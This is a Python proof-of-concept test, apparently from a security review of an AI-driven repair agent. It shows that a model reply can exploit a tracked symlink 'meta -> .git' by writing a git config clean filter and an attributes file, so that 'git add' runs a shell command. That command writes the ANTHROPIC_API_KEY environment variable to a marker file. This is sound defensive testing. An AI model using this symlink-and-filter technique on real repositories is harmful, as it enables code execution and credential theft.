"""R5c: end to end. main contains a tracked symlink `meta -> .git`; a model reply writes meta/config (a clean
filter) and meta/info/attributes; the hardened `git add` still runs the filter: code execution in the repair job."""
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import patch

from ops import agent

origin = Path(tempfile.mkdtemp()) / "origin.git"
subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(origin)], check=True)
repo = Path(tempfile.mkdtemp()) / "repo"
subprocess.run(["git", "clone", "-q", str(origin), str(repo)], check=True, capture_output=True)
g = lambda *a: subprocess.run(["git", "-C", str(repo), *a], check=True, capture_output=True)
(repo / "app.py").write_text("x = 1\n")
(repo / "meta").symlink_to(".git")
g("add", ".")
g("-c", "user.name=a", "-c", "user.email=a@a", "commit", "-qm", "init")
g("push", "-q", "origin", "HEAD:main")
g("fetch", "-q")
marker = Path(tempfile.mkdtemp()) / "PWNED"
config = (repo / ".git" / "config").read_text() + f'[filter "x"]\n\tclean = "sh -c \'echo $ANTHROPIC_API_KEY > {marker}; cat\'"\n'
answer = {"title": "fix", "body": "", "files": {"meta/config": config, "meta/info/attributes": "*.py filter=x\n",
                                                "app.py": "x = 2\n"}}


class GH:
    def open_pull(self, *a):
        return {"number": 1}


with patch.object(agent, "claude", lambda p, k: answer), patch.dict("os.environ", {"ANTHROPIC_API_KEY": "sk-ant-secret"}):
    try:
        print("open_repair:", agent.open_repair(repo, GH(), "sast", "code", "sast", "found:1", "k"))
    except Exception as exc:  # noqa: BLE001
        print("open_repair raised:", type(exc).__name__, str(exc)[:200])
print("marker written:", marker.exists(), "->", marker.read_text().strip() if marker.exists() else "")
